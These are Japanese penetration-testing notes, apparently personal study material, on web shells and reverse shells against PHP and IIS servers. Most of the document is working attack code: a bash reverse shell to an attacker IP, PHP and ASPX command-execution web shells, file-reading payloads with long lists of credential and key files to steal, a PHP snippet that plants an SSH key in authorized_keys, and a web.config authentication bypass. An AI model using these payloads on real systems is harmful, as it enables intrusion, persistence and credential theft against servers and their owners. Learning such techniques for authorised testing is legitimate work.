- 関連ノート：
	- [[What is the shell]]

---

# WebShellからReverse Shellへの展開

- Kali にはデフォルトで`/usr/share/WebShells`にプログラム言語ごとにさまざまなリバースシェルペイロードが用意されている
- [Reverse Shell Generator](https://www.revshells.com/)を使うのが簡単

🐧Linux：Web shell上に以下のコマンドをエンコードて実行する
```zsh
<url>?cmd=bash -c 'bash -i >& /dev/tcp/<AttackerIP>/443 0>&1'
```
- エンコード方法はターゲット環境に応じて異なる
- 基本はBurp SuiteのHackVertorを使って、"url_encode_not_plus"する

🪟Windows：[[What is the shell#Base64化したPowerShellリバースシェルワンライナー]]


Reverse Shell を実行したのに接続が確立しない場合、FWなどにより遮断されていないか、問題の切り分けに使う
```zsh
# Attacker
sudo tcpdump -nni any host <AttackerIP> and port 4444
sudo nc -lvnp 4444

# Target Web shell
<url>?cmd=bash -c 'bash -i >& /dev/tcp/<AttackerIP>/4444 0>&1'
```
- 何も表示されない場合は、コマンドが実行されていないか、FWで遮断
- SYNパケットのみ届く場合は、ポート番号が誤っている

---

# Web Shellの基本

## 特徴・用途

- Web shellとは、Webサーバー上でコードを実行するスクリプトの俗称
- サーバーに書き込み可能なWebアプリ上で、Bind / Reverse Shellが使えない場合は、代わりにWebShellを使用する
	- 💡==WebShellからBind / Reverse Shellに展開==が可能

- Webサーバ(通常はPHPやASPなどの言語）内で実行される
- HTMLフォームやURLの引数として入力したコマンドが実行される
- 実行可能なファイル形式はwebサーバのconfigに定義されており、実行可能でないファイルは、アクセスしてもファイルの中身が表示されるだけ
	- 💡`.htaccess`で`AllowOwerride`が有効であれば、ファイルの拡張子を`hoge`としても`php`として読み込ませることが可能

## WebShellの基本セットアップ

- ターゲットのテクノロジースタックに合わせて、ペイロードを変更する（WappalyzerやBurp Suiteのレスポンスキャプチャで判別可能）

以下、PHPを例に記載する

1. phpのwebシェルスクリプトファイルを作成する
```php
<?php echo system($_GET["cmd"]); ?>
```

2. 作成したシェルスクリプトファイルを、Webアプリケーションにアップロード
	- アップロードの手段には、uploads機能（リモート）、もしくはファイル書き込み（ローカル）などがあり、初期侵入や横展開を目的としている

3. URLのcmd引数に任意のコマンドを入力する。
	- ※ 複数クエリの場合は、`&`も使う：`index.php?path=hoge.txt&cmd=whoami`
![[Pasted image 20230320131618.png]]
$$WebShell実行例$$

---

# Web Shell実行における注意とTips

## ⚠️注意点

- PentestMonkeyのペイロードのように、サイズが大きいものはうまくいかないときがある
	- →シンプルなWebShellを用意：`<?php echo system($_GET["cmd"]); ?>`

- PHPなどの言語固有のリバースシェルペイロードは、Unixベースのターゲット向けに書かれていることに注意
	- これらは、デフォルトでは<u>Windowsで動作しない</u>

- Webアプリケーションにペイロードをアップロードできても、phpでは、`shell_exec`の無効化などにより、`?cmd=id`などが実行できないことがある→[[#トラブルシューティング]]

## 💡Tips

- 次の流れで==LatMov==の可能性あり
	1. 低権限ユーザーでシェル獲得
	2. web root(`/var/www/html`等）に書き込みが可能であり、Webシェルペイロードをアップロードする
	3. 攻撃者のブラウザからアップロードしたペイロードにリクエスト
	4. Apache or IISのWeb shellを獲得
	5. Web shellから安定したreverse shellへ展開し、インタラクティブなシェルを獲得

- Linuxシステムにおけるファイルアップロード先として、初期侵入後は`/dev/shm`がベスト（webから読み込めるのであれば）
	- *PrivateTmp*の影響を受けないから
		- `/tmp`や`/var/tmp`は他のプロセスや同じApacheの別リクエストからもアクセスできないようにしているため、使えない
	- 通常書き込み可能だから
	- すべてのプロセスから同じパスでアクセス可能だから

---

# Webアプリのソースコードを取得する考え方と手法概要

- 関連ノート：
	- [[Summary - Apex]]

## 目的

- Webアプリ（PHP / ASP / ASPX など）のサーバーサイドソースコードを入手し、ソース内に記載された以下の機密情報を取得すること
	- ハードコードされた認証情報
	- APIキー
	- 内部パス情報

## シチュエーション

- Web shellが実行できず、Information Disclosureにフォーカスするとき
- ==異なるアクセスチャネルを利用して情報を取得する==必要がある

## なぜHTTPからは取得できないのか

PHPやASPなどのサーバーサイド言語は、
HTTP経由でアクセスすると「実行結果のみ」が返却される

例：config.php
```php
<?php $password = "SuperSecret123"; ?>
<body>Hello!</body>
```
```sh
http://example/config.php
# Hello!
```

## ソースコードを取得できる条件

- HTTPとSMBで同じ物理ディレクトリを共有しているケースなどで有効

- 例えば、`/var/www/html/Documents`がHTTP と SMBの両方から参照可能な場合
	1. HTTPの*Path Traversal*の脆弱性を利用して`Documents`にPHPファイルを転送
	2. SMBでPHPファイルのソースコードを読み取る

---
---

# バックエンドテクノロジーごとの攻撃手法

## PHP

### 基本コマンド

```php
<?php echo system($_GET["cmd"]); ?>
# 例：http://example.com/page?cmd=id
```

### ターゲット状態確認コマンド

- cmd引数でコマンド実行できないとき、現在の状態確認
- phpinfoの内容、コマンド実行に必要なphp関数の有効有無
```php
<?php
	echo "<h3>phpinfo()</h3>";
	phpinfo();
	echo "<h3>disabled functions</h3>";
	echo nl2br(ini_get('disable_functions'))."<br>";
	echo "<h3>working dir & perms</h3>";
	echo "cwd: ".getcwd()."<br>";
	echo "uid: ".getmyuid()." gid: ".getmygid()."<br>";
	echo "<h3>can exec /proc?</h3>";
	echo "can proc_open? ".(function_exists('proc_open')? 'yes' : 'no')."<br>";
	echo "can shell_exec? ".(function_exists('shell_exec')? 'yes' : 'no')."<br>";
	echo "allow_url_fopen: ".ini_get('allow_url_fopen')."<br>";
?>
```
- Web Shellができないなら、攻撃は==ファイル読み取り==に切り替える

| チェック項目                              | 確認内容                                     | 無効/制限されている場合                                                 | Web Shellへの影響                                                      |
| ----------------------------------- | ---------------------------------------- | ------------------------------------------------------------ | ------------------------------------------------------------------ |
| system() が使えない                      | `system()` が無効化                          | `system($_GET['cmd'])` が使えない                                 | 最もシンプルな Web Shell が動かない。代替: `shell_exec()`, `exec()`, `passthru()` |
| shell_exec() が使えない                  | `shell_exec()` が無効化                      | `echo shell_exec($_GET['cmd'])` が使えない                        | 代替: `system()`, `exec()`, `passthru()`, backtick                   |
| exec() が使えない                        | `exec()` が無効化                            | `exec($_GET['cmd'], $out)` が使えない                             | 代替: `system()`, `shell_exec()`, `passthru()`                       |
| passthru() が使えない                    | `passthru()` が無効化                        | `passthru($_GET['cmd'])` が使えない                               | 代替: `system()`, `shell_exec()`, `exec()`                           |
| proc_open() が使えない                   | `proc_open()` が無効化                       | Pure PHP Reverse Shell (双方向通信型) が構築できない                      | 代替: bash利用の Reverse Shell (`bash -i >& /dev/tcp/IP/PORT`)          |
| disable_functions に全てのコマンド実行関数が含まれる | system, exec, shell_exec, passthru等が全て無効 | 全てのコマンド実行手法が使えない                                             | 致命的: Web Shell もReverse Shell も構築不可                                |
| getcwd() が chroot jail 内            | ファイルシステムが制限された環境                         | jail 外のディレクトリにアクセス不可                                         | 探索・操作範囲が大幅に制限される                                                   |
| allow_url_fopen が Off               | リモートファイル読込が無効                            | `file_get_contents('http://<AttackerIP>/payload.txt')` が使えない | ペイロードのダウンロードができない。代替: curlコマンド、wgetコマンド                            |
| allow_url_include が Off             | リモートファイル実行が無効                            | `include($_GET['url'])` 型の攻撃が不可                              | LFI/RFI が制限される（ただし通常は Off が推奨）                                     |
| open_basedir が設定されている               | アクセス可能ディレクトリが制限                          | 設定されたパス外のファイルにアクセス不可                                         | `/var/www/html` 外を探索できない等の制限                                       |
| safe_mode が On                      | (PHP<5.4) 安全モードが有効                       | 多くの関数・コマンドが制限される                                             | 古い環境でのみ影響。代替手法を探す必要                                                |

### File読み取り

- Web Shellが実行できないときに使用

基本
```php
<?php echo nl2br(file_get_contents('<filepath>')); ?>
```

再帰探索
```php
<?php
	$files = glob('<directory_path>/*');
	foreach ($files as $f) {
	    echo "===== $f =====\n";
	    echo nl2br(file_get_contents($f));
	}
?>
```

#### Unix/Linux + Apache環境

| カテゴリ                | ファイルパス                                        | 目的                 |
| ------------------- | --------------------------------------------- | ------------------ |
| システム情報              | `/etc/passwd`                                 | ユーザー一覧、ホームディレクトリ確認 |
|                     | `/etc/shadow`                                 | パスワードハッシュ（読めれば）    |
|                     | `/etc/group`                                  | グループ情報             |
|                     | `/etc/hosts`                                  | ホスト名マッピング          |
|                     | `/proc/self/environ`                          | 現プロセスの環境変数         |
|                     | `/proc/self/cmdline`                          | 起動コマンドライン          |
| Apache設定            | `/etc/apache2/apache2.conf`                   | メイン設定              |
|                     | `/etc/apache2/sites-enabled/000-default.conf` | バーチャルホスト設定         |
|                     | `/etc/apache2/sites-available/*.conf`         | 利用可能なサイト設定         |
|                     | `/etc/apache2/envvars`                        | Apache環境変数         |
|                     | `/etc/apache2/.htpasswd`                      | Basic認証情報          |
|                     | `/var/www/html/.htaccess`                     | ディレクトリ設定           |
| PHP設定               | `/etc/php/8.1/apache2/php.ini`                | PHP設定（バージョン要確認）    |
|                     | `/etc/php/*/apache2/conf.d/*.ini`             | 追加PHP設定            |
|                     | `/usr/local/lib/php.ini`                      | 代替PHPパス            |
| MySQL設定             | `/etc/mysql/my.cnf`                           | メイン設定              |
|                     | `/etc/mysql/mysql.conf.d/mysqld.cnf`          | サーバー設定             |
|                     | `/etc/mysql/debian.cnf`                       | Debian用認証情報        |
|                     | `/root/.my.cnf`                               | root用MySQL設定       |
|                     | `/home/*/.my.cnf`                             | ユーザー別MySQL設定       |
| アプリ設定               | `/var/www/html/config.php`                    | アプリ設定              |
|                     | `/var/www/html/database.php`                  | DB接続情報             |
|                     | `/var/www/html/db.php`                        | DB接続情報             |
|                     | `/var/www/html/settings.php`                  | 設定ファイル             |
|                     | `/var/www/html/.env`                          | 環境変数ファイル           |
|                     | `/var/www/html/config/database.php`           | DB設定（ディレクトリ分け）     |
|                     | `/var/www/html/includes/config.php`           | インクルード設定           |
|                     | `/var/www/html/app/config/*.php`              | アプリケーション設定         |
|                     | `/var/www/html/wp-config.php`                 | WordPress設定        |
| バックアップ              | `/var/www/html/*.bak`                         | バックアップファイル         |
|                     | `/var/www/html/*.old`                         | 旧ファイル              |
|                     | `/var/www/html/*.backup`                      | バックアップ             |
|                     | `/var/www/html/*~`                            | エディタバックアップ         |
|                     | `/var/www/html/*.swp`                         | Vim一時ファイル          |
| Git/Version Control | `/var/www/html/.git/config`                   | Git設定（認証情報）        |
|                     | `/var/www/html/.git/HEAD`                     | 現在のブランチ            |
|                     | `/var/www/html/.gitignore`                    | 除外ファイル一覧           |
| SSH                 | `/home/*/.ssh/id_rsa`                         | 秘密鍵                |
|                     | `/home/*/.ssh/id_rsa.pub`                     | 公開鍵                |
|                     | `/home/*/.ssh/authorized_keys`                | 許可された公開鍵           |
|                     | `/home/*/.ssh/known_hosts`                    | 既知ホスト              |
|                     | `/home/*/.ssh/config`                         | SSH設定              |
|                     | `/etc/ssh/sshd_config`                        | SSHサーバー設定          |
| 履歴ファイル              | `/home/*/.bash_history`                       | コマンド履歴             |
|                     | `/home/*/.mysql_history`                      | MySQLコマンド履歴        |
|                     | `/home/*/.php_history`                        | PHPコマンド履歴          |
|                     | `/root/.bash_history`                         | root履歴             |
| ログファイル              | `/var/log/apache2/access.log`                 | Apacheアクセスログ       |
|                     | `/var/log/apache2/error.log`                  | Apacheエラーログ        |
|                     | `/var/log/auth.log`                           | 認証ログ               |
|                     | `/var/log/mysql/error.log`                    | MySQLエラーログ         |
|                     | `/var/log/syslog`                             | システムログ             |
| Cron/スケジュール         | `/etc/crontab`                                | システムcron           |
|                     | `/var/spool/cron/crontabs/*`                  | ユーザーcron           |
|                     | `/etc/cron.d/*`                               | cron.d設定           |
| FTP設定               | `/etc/vsftpd.conf`                            | vsftpd設定           |
|                     | `/etc/vsftpd/user_list`                       | ユーザーリスト            |
|                     | `/etc/ftpusers`                               | FTP禁止ユーザー          |

#### Windows + IIS環境

| カテゴリ         | ファイルパス                                                                                       | 目的                 |
| ------------ | -------------------------------------------------------------------------------------------- | ------------------ |
| システム情報       | `C:\Windows\System32\drivers\etc\hosts`                                                      | ホスト名マッピング          |
|              | `C:\Windows\win.ini`                                                                         | Windows設定          |
|              | `C:\boot.ini`                                                                                | ブート設定              |
|              | `C:\Windows\System32\config\SOFTWARE`                                                        | レジストリハイブ（要権限）      |
| IIS設定        | `C:\Windows\System32\inetsrv\config\applicationHost.config`                                  | IISメイン設定           |
|              | `C:\inetpub\wwwroot\web.config`                                                              | サイト設定・ASP.NET設定    |
|              | `C:\Windows\System32\inetsrv\config\administration.config`                                   | 管理設定               |
| ASP.NET設定    | `C:\inetpub\wwwroot\web.config`                                                              | 接続文字列、アプリ設定        |
|              | `C:\inetpub\wwwroot\appsettings.json`                                                        | .NET Core設定        |
|              | `C:\inetpub\wwwroot\appsettings.Development.json`                                            | 開発環境設定（漏洩多い）       |
|              | `C:\inetpub\wwwroot\Global.asax`                                                             | アプリケーションイベント       |
|              | `C:\inetpub\wwwroot\App_Data\*.mdf`                                                          | ローカルDBファイル         |
| MSSQL設定      | `C:\Program Files\Microsoft SQL Server\MSSQL*.MSSQLSERVER\MSSQL\Binn\mssql.exe.config`       | SQL Server設定       |
|              | `C:\Program Files\Microsoft SQL Server\*\MSSQL\DATA\master.mdf`                              | マスターデータベース         |
|              | `C:\Program Files\Microsoft SQL Server\*\MSSQL\DATA\model.mdf`                               | モデルデータベース          |
| PostgreSQL設定 | `C:\Program Files\PostgreSQL\*\data\postgresql.conf`                                         | メイン設定              |
|              | `C:\Program Files\PostgreSQL\*\data\pg_hba.conf`                                             | 認証設定               |
| バックアップ       | `C:\inetpub\wwwroot\*.bak`                                                                   | バックアップファイル         |
|              | `C:\inetpub\wwwroot\*.old`                                                                   | 旧ファイル              |
|              | `C:\inetpub\wwwroot\bin\*.pdb`                                                               | デバッグシンボル（情報漏洩）     |
|              | `C:\Program Files\Microsoft SQL Server\MSSQL*.MSSQLSERVER\MSSQL\Backup\*.bak`                | データベースバックアップ       |
|              | `C:\*.bak`                                                                                   | 管理者による手動バックアップ     |
| ログファイル       | `C:\inetpub\logs\LogFiles\W3SVC1\*.log`                                                      | IISアクセスログ          |
|              | `C:\Windows\System32\LogFiles\HTTPERR\*.log`                                                 | HTTPエラーログ          |
|              | `C:\Program Files\Microsoft SQL Server\MSSQL*.MSSQLSERVER\MSSQL\Log\ERRORLOG`                | MSSQL現在のエラーログ      |
|              | `C:\Program Files\Microsoft SQL Server\MSSQL*.MSSQLSERVER\MSSQL\Log\ERRORLOG.*`              | MSSQL過去のエラーログ      |
|              | `C:\Program Files\Microsoft SQL Server\MSSQL*.MSSQLSERVER\MSSQL\Log\SQLAGENT.OUT`            | SQL Serverエージェントログ |
| 認証情報         | `C:\Users\*\.ssh\id_rsa`                                                                     | SSH秘密鍵             |
|              | `C:\Users\*\AppData\Roaming\FileZilla\recentservers.xml`                                     | FileZilla接続履歴      |
|              | `C:\Users\*\AppData\Roaming\Microsoft\SQL Server Management Studio\*\SqlStudio.bin`          | SSMS設定（暗号化）        |
|              | `C:\Users\*\Documents\SQL Server Management Studio\*.sql`                                    | 保存されたSQLスクリプト      |
|              | `C:\Users\*\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt` | PowerShell履歴       |


#### phpinfo 着眼点

##### 致命的・高リスクな設定（RCE / RFI / LFI）

| 設定項目 (Directive)    | 注目すべき値          | ペンテスト観点でのリスク・攻撃手法           | 解説                                                                                                         |
| ------------------- | --------------- | --------------------------- | ---------------------------------------------------------------------------------------------------------- |
| `allow_url_include` | On              | RFI (Remote File Inclusion) | ・【最重要】 外部サーバーの悪意あるPHPスクリプトを `include()` 可能<br>・RCE（遠隔コード実行）に直結する設定                                         |
| `allow_url_fopen`   | On              | RFI / SSRF / 外部ファイル読込       | ・PHPスクリプトから外部URLへのアクセスが可能<br>・`allow_url_include` と併用でRFIが成立<br>・Offでも `file_get_contents` 等でのSSRF踏み台リスクあり |
| `disable_functions` | 空欄 または 主要関数なし   | Web Shellによるコマンド実行          | ・`system`, `exec`, `shell_exec`, `passthru` 等が制限されていない状態<br>・Web Shell経由でのOSコマンド実行が容易                      |
| `open_basedir`      | no value (設定なし) | LFI (Local File Inclusion)  | ・ファイル操作のディレクトリ制限がない状態<br>・LFI脆弱性がある場合、`/etc/passwd` 等のシステムファイルへアクセス可能                                      |
| `file_uploads`      | On              | ファイルアップロード攻撃                | ・攻撃者がWebシェル等をアップロードできる前提条件<br>・`upload_max_filesize` と併せてサイズ制限も確認が必要                                       |
| `enable_dl`         | On              | 拡張モジュールのロード                 | ・実行時に動的にPHP拡張モジュールをロード可能<br>・悪意ある `.so` や `.dll` をロードさせ、システム制御を奪取可能                                        |

##### 情報漏洩・探索に役立つ設定

| 設定項目 (Directive)    | 注目すべき値    | ペンテスト観点でのリスク・攻撃手法              | 解説                                                                                           |
| ------------------- | --------- | ------------------------------ | -------------------------------------------------------------------------------------------- |
| `display_errors`    | On        | フルパス漏洩 / エラー情報                 | ・エラーメッセージがブラウザに出力される状態<br>・ディレクトリのフルパス（`/var/www/html/...`）特定が可能<br>・SQLi等のテスト時にDBエラー詳細を確認可能 |
| `session.save_path` | 書き込み可能なパス | Session Poisoning (LFI to RCE) | ・セッションファイルの保存先パス<br>・LFI脆弱性と組み合わせ、汚染されたセッションデータ（PHPコード含む）を読み込ませてRCEへ繋げる攻撃に利用                 |
| `document_root`     | (パス情報)    | Webルートの特定                      | ・Webサイトの物理パス（例：`/var/www/html`）を特定<br>・SQLiで `INTO OUTFILE` を使用する際の保存先パス特定に必須                |
| `extension_dir`     | (パス情報)    | LFIの探索                         | ・PHP拡張モジュールの格納ディレクトリ<br>・LFI攻撃時にこのディレクトリ内のファイルをターゲットにする場合あり                                  |
| `upload_tmp_dir`    | (パス情報)    | LFI via Upload                 | ・アップロードファイルの一時保存先<br>・空白の時は`/tmp`に保存されることが多い                                                 |

##### 環境情報・その他（Privilege Escalation / Architecture）

| 設定項目 (Directive)     | 注目すべき値             | ペンテスト観点でのリスク・攻撃手法         | 解説                                                                                                      |
| -------------------- | ------------------ | ------------------------- | ------------------------------------------------------------------------------------------------------- |
| `System`             | Kernel Ver / Arch  | Kernel Exploit / Payloads | ・OS種類、カーネルバージョン、アーキテクチャ（x86/x64）の確認<br>・権限昇格（PrivEsc）用のExploit選定に使用                                     |
| `PHP Version`        | 古いバージョン            | CVE (既知の脆弱性)              | ・PHP自体に既知の脆弱性（バッファオーバーフロー等）がないか確認                                                                       |
| `$_SERVER` / `$_ENV` | API Key / Password | 機密情報の漏洩                   | ・ページ下部の環境変数セクション（Environment / PHP Variables）<br>・`AWS_ACCESS_KEY` や `DB_PASSWORD` 等の機密情報が誤って露出していないか確認 |
| `imagick`            | インストール済み           | ImageTragick (RCE)        | ・ImageMagickのバージョン確認<br>・古い場合、画像処理の脆弱性（CVE-2016-3714等）を利用したRCEが可能                                       |

### SSH鍵書き込みによるエクスプロイト

- 関連ノート：[[22 - SSH#公開鍵一覧の書き換え]]
- ⚠️webサーバを動作させているユーザにはその権限があることは少ない

```php
<?php
// 公開鍵の内容（改行なしの1行）
$public_key = "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQC... kali@kali\n";

// .sshディレクトリを作成（存在しない場合）
@mkdir('/home/<username>/.ssh', 0700, true);

// authorized_keysに書き込み
file_put_contents('/home/<username>/.ssh/authorized_keys', $public_key);

// パーミッション設定
chmod('/home/<username>/.ssh', 0700);
chmod('/home/<username>/.ssh/authorized_keys', 0600);

echo "Public key added successfully!";
?>
```

---

## ASP / ASP.NET (IIS)

### 基本 Web Shell

- Payload：[cmdexec.aspx - GitHub](https://github.com/tennc/webshell/blob/master/aspx/asp.net-backdoors/cmdexec.aspx)
```aspx
<%@ Page Language="C#" %>
<%
Response.Write(
    new System.IO.StreamReader(
        new System.Diagnostics.Process(){
            StartInfo = new System.Diagnostics.ProcessStartInfo(){
                FileName="cmd.exe",
                Arguments="/c " + Request["cmd"],
                RedirectStandardOutput=true,
                UseShellExecute=false,
                CreateNoWindow=true
            }
        }.Start().StandardOutput.BaseStream
    ).ReadToEnd()
);
%>
```
実行例
```
http://target/shell.aspx?cmd=whoami
```

### Identify Target

```aspx
<%@ Page Language="C#" %>
<%@ Import Namespace="System.Security.Principal" %>
<%@ Import Namespace="System.IO" %>

User: <%= WindowsIdentity.GetCurrent().Name %><br>
Machine: <%= Environment.MachineName %><br>
OS: <%= Environment.OSVersion %><br>
64bit: <%= Environment.Is64BitOperatingSystem %><br>
AppPool Identity: <%= WindowsIdentity.GetCurrent().Name %><br>
Current Dir: <%= Directory.GetCurrentDirectory() %><br>
```

### ファイル読み取り

```aspx
<%@ Page Language="C#" %>
<%@ Import Namespace="System.IO" %>
<%= File.ReadAllText(@"<file_path>") %>
```

#### 重要ファイル（Windows + IIS）

| パス                                                        | 内容            | ペンテスト的に嬉しいポイント                                                    |
| --------------------------------------------------------- | ------------- | ----------------------------------------------------------------- |
| C:\inetpub\wwwroot\web.config                             | サイト設定 / 接続文字列 | DB資格情報取得 → MSSQLログイン、machineKey取得 → ViewState改ざん・認証クッキー偽造、認証方式の把握 |
| C:\Windows\System32\inetsrv\config\applicationHost.config | IIS全体設定       | 仮想ディレクトリ・物理パス特定 → 隠しサイト発見・横展開、ハンドラ設定 → 実行可能拡張子把握、認証方式確認           |
| C:\inetpub\wwwroot\bin*.dll                               | .NETアセンブリ     | dnSpy / ILSpyで逆コンパイル → ハードコード資格情報・内部API・暗号鍵・ファイルパス取得              |
| C:\inetpub\wwwroot\App_Data*.mdf                          | ローカルDB        | オフライン解析 → ユーザー・ハッシュ取得 → クラック・資格情報再利用、アプリ構造把握                      |
| C:\inetpub\wwwroot\appsettings.json                       | .NET Core設定   | DB接続文字列・APIキー・JWTシークレット取得 → APIなりすまし・DB侵入                         |
| C:\inetpub\wwwroot\Global.asax                            | アプリケーションイベント  | 認証処理・ルーティング理解 → 認可バイパス・攻撃対象エンドポイント特定                              |
| C:\Program Files\Microsoft SQL Server                     | MSSQL本体       | DBファイル・設定取得 → サービスアカウント特定・権限昇格・バックアップから機密取得                       |
| C:\Users*\AppData\Roaming\FileZilla\recentservers.xml     | FTP接続履歴       | 平文FTP資格情報取得 → 別サーバ侵入・Webroot書き込み・横展開                              |

### ファイルアップロード

- 実行可能拡張子
	- aspx
	- ashx
	- asmx
- 拡張子は、[[⚡️File upload vuln#サーバ設定の上書きによるバイパス]]で変更できる可能性がある

#### 認証バイパス

- IIS / ASP.NET の設定評価ルールとして、子ディレクトリの web.config は親の web.config を継承し、追加ルールとして評価される
- 子ディレクトリで親の web.config をclear（無効に）したうえで認証を不要とするweb.config を置けば、アクセスが可能になる
```xml
<?親?>
<authorization>
  <deny users="?" />
</authorization>
```

子ディレクトリに以下を置くと認証をバイパスできる
```xml
<?子?>
<authorization>
  <clear />
　<allow users="*" />
</authorization>
```

---
---

# トラブルシューティング

## リスナーで invalid shell / 接続が来ない場合の切り分け

### 想定される原因

- FW のルールで遮断されている
- ターゲット側のコマンド制約
	- 使用したツールがターゲット環境に存在しない
	- `nc` などのコマンドが通常版ではなく制限付き
- Web shell実行関数の制限（主に PHP）
	- `phpinfo()` の `disable_functions` により以下が無効化
	    - `exec`
	    - `system`
	    - `shell_exec`
	    - `passthru`  

### 原因ごとの対応

#### FW による遮断

- 何も起きないときはネットワーク到達性を疑う
- FW で完全に遮断されている場合は、そもそも `invalid shell` にすらならない  
- つまり`invalid shell` が出る＝通信は届いている

1. ICMP が通るか確認
```sh
# 攻撃者
sudo tcpdump -i tun0
# ターゲット
ping -c3 <attacker_ip> 
```
- tcpdump に ICMP が見えればpingは通る

2. HTTP 通信が可能か確認
```sh
# 攻撃者
echo test > test.txt
sudo python -m http.server 80

# ターゲット
wget <attacker_ip>/test.txt
```
- ファイル取得できるか
- 攻撃者側の python HTTP サーバログにGETリクエストが来るか

#### ターゲット側のコマンド制限

- 通常の `nc` が使えないケースがあるため`busybox`などとあわせて使う（そのほか、[revshell generator](https://www.revshells.com/)から別の手段を試す）

#### Web shell 実行関数の制限

- PHP の設定をまずは確認
```php
<?php phpinfo(); ?>
```
- `disable_functions`に以下があれば、Web shell はそもそも実行できない
	- `exec`
	- `system`
	- `shell_exec`
	- `passthru`
	- `popen`
	- `proc_open`

- 実行できないときは、攻撃ベクターを[[#File読み取り]]に切り替える

